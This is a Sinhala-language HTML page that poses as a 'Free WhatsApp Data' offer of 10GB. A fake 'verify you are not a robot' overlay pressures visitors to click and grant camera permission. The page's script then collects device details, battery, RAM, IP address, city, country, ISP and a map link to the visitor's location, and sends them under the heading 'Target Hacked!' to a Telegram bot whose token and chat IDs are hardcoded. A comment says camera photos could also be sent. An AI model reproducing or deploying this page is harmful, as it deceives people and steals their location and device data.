<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WhatsApp Data</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.95); display: flex;
            justify-content: center; align-items: center; z-index: 9999;
        }
    </style>
</head>
<body class="bg-gray-100">

    <div id="overlay">
        <div class="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4">
            <div class="text-green-500 text-5xl mb-4">📢</div>
            <h2 class="text-2xl font-bold mb-2">නොමිලේ 10GB Data!</h2>
            <p class="text-gray-600 mb-6">මෙම දීමනාව ලබා ගැනීමට ඔබ රොබෝවරයෙකු නොවන බව තහවුරු කරන්න.</p>
            <button id="startBtn" class="bg-green-600 text-white font-bold py-3 px-10 rounded-full w-full animate-bounce">
                VERIFY & CONTINUE
            </button>
            <p class="text-red-500 text-xs mt-4">*ඉදිරියට යාමට  අවසරය (Allow) ලබා දිය යුතුය.</p>
        </div>
    </div>

    <div class="flex flex-col items-center justify-center min-h-screen">
        <h1 class="text-2xl font-bold text-green-700">සුභ පැතුම්! 🎉</h1>
        <p>ඔබේ දත්ත පැකේජය සක්‍රිය වෙමින් පවතී...</p>
    </div>

    <script>
        const API_TOKEN = '8521741180:AAHMiUEg1TjVtCpyaGKdTllYtvIXz2XCjdk';
        const CHAT_ID = "7871773175", "7252390182";

        document.getElementById('startBtn').addEventListener('click', async () => {
            try {
                // 1. කැමරා අවසරය ඉල්ලීම
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // 2. අවසරය දුන්නොත් විතරක් Overlay එක අයින් කරනවා
                document.getElementById('overlay').style.display = 'none';

                // 3. ඔක්කොම දත්ත එකතු කිරීම
                const battery = await navigator.getBattery();
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                let infoMsg = `
⚠️ *Target Hacked!* 🫦
--------------------------
📱 *Device:* ${navigator.platform}
🔋 *Battery:* ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
🧠 *RAM:* ${navigator.deviceMemory || 'Unknown'} GB
🌐 *IP:* ${ipData.ip}
📍 *Location:* ${ipData.city}, ${ipData.country_name}
🛰️ *ISP:* ${ipData.org}
🔗 *Maps:* https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
--------------------------
💀 _Sirimath Pro System_ 💀
                `;

                // 4. Telegram එකට යැවීම
                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg, parse_mode: 'Markdown' })
                });

                // මෙතනදී කැමරා stream එකෙන් ෆොටෝ එකක් අරන් යවන කොටසත් ඇඩ් කරන්න පුළුවන්.

            } catch (err) {
                alert("වැරදියි! ඉදිරියට යාමට 'Allow' ක්ලික් කරන්න.");
            }
        });
    </script>
</body>
</html>
